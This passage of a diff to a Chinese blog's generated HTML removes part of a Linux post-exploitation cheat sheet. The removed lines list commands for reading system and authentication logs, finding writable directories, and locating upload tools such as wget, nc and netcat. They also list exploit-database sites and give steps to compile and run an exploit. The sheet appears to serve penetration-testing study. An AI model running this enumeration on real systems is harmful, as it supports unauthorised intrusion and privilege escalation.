/var/lib/dhcp3/dhclient.lea</span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /var/log/apache2/access_log</span><br><span class="line">cat /var/log/apache2/access.log</span><br><span class="line">cat /var/log/apache2/error_log</span><br><span class="line">cat /var/log/apache2/error.log</span><br><span class="line">cat /var/log/apache/access_log</span><br><span class="line">cat /var/log/apache/access.log</span><br><span class="line">cat /var/log/auth.log</span><br><span class="line">cat /var/log/chttp.log</span><br><span class="line">cat /var/log/cups/error_log</span><br><span class="line">cat /var/log/dpkg.log</span><br><span class="line">cat /var/log/faillog</span><br><span class="line">cat /var/log/httpd/access_log</span><br><span class="line">cat /var/log/httpd/access.log</span><br><span class="line">cat /var/log/httpd/error_log</span><br><span class="line">cat /var/log/httpd/error.log</span><br><span class="line">cat /var/log/lastlog</span><br><span class="line">cat /var/log/lighttpd/access.log</span><br><span class="line">cat /var/log/lighttpd/error.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.access.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.error.log</span><br><span class="line">cat /var/log/messages</span><br><span class="line">cat /var/log/secure</span><br><span class="line">cat /var/log/syslog</span><br><span class="line">cat /var/log/wtmp</span><br><span class="line">cat /var/log/xferlog</span><br><span class="line">cat /var/log/yum.log</span><br><span class="line">cat /var/run/utmp</span><br><span class="line">cat /var/webmin/miniserv.log</span><br><span class="line">cat /var/www/logs/access_log</span><br><span class="line">cat /var/www/logs/access.log</span><br><span class="line">ls -alh /var/lib/dhcp3/</span><br><span class="line">ls -alh /var/log/postgresql/</span><br><span class="line">ls -alh /var/log/proftpd/</span><br><span class="line">ls -alh /var/log/samba/</span><br></pre></td></tr></table></figure>
-<h4 id="网站文件"><a href="#网站文件" class="headerlink" title="网站文件"></a>网站文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -alhR /var/www/</span><br><span class="line">ls -alhR /srv/www/htdocs/</span><br><span class="line">ls -alhR /usr/local/www/apache22/data/</span><br><span class="line">ls -alhR /opt/lampp/htdocs/</span><br><span class="line">ls -alhR /var/www/html/</span><br></pre></td></tr></table></figure>
-<h4 id="文件挂载"><a href="#文件挂载" class="headerlink" title="文件挂载"></a>文件挂载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br><span class="line">df -h</span><br><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>
-<h4 id="可写目录"><a href="#可写目录" class="headerlink" title="可写目录"></a>可写目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null      # 可写目录</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 </span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # 可写目录</span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录</span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # 可写可执行目录</span><br></pre></td></tr></table></figure>
-<h2 id="0x06-准备与攻击"><a href="#0x06-准备与攻击" class="headerlink" title="0x06 准备与攻击"></a>0x06 准备与攻击</h2><h4 id="语言支持"><a href="#语言支持" class="headerlink" title="语言支持"></a>语言支持</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name perl*</span><br><span class="line">find / -name python*</span><br><span class="line">find / -name gcc*</span><br><span class="line">find / -name cc</span><br></pre></td></tr></table></figure>
-<h4 id="上传方式"><a href="#上传方式" class="headerlink" title="上传方式"></a>上传方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name wget</span><br><span class="line">find / -name nc*</span><br><span class="line">find / -name netcat*</span><br><span class="line">find / -name tftp*</span><br><span class="line">find / -name ftp</span><br></pre></td></tr></table></figure>
-<h4 id="寻找exp"><a href="#寻找exp" class="headerlink" title="寻找exp"></a>寻找exp</h4><ul>
-<li><a href="http://www.exploit-db.com" target="_blank" rel="noopener">http://www.exploit-db.com</a></li>
-<li><a href="http://1337day.com" target="_blank" rel="noopener">http://1337day.com</a></li>
-<li><a href="http://www.securiteam.com" target="_blank" rel="noopener">http://www.securiteam.com</a></li>
-<li><a href="http://www.securityfocus.com" target="_blank" rel="noopener">http://www.securityfocus.com</a></li>
-<li><a href="http://www.exploitsearch.net" target="_blank" rel="noopener">http://www.exploitsearch.net</a></li>
-<li><a href="http://metasploit.com/modules/" target="_blank" rel="noopener">http://metasploit.com/modules/</a></li>
-<li><a href="http://securityreason.com" target="_blank" rel="noopener">http://securityreason.com</a></li>
-<li><a href="http://seclists.org/fulldisclosure/" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/</a></li>
-<li><a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a></li>
-</ul>
-<h4 id="编译exp"><a href="#编译exp" class="headerlink" title="编译exp"></a>编译exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">which gcc</span><br><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure>
-<h4 id="运行exp"><a href="#运行exp" class="headerlink" title="运行exp"></a>运行exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2661,7 +2673,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">87</span>
+                <span class="site-state-item-count">88</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2725,7 +2737,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2018</span>
+  <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
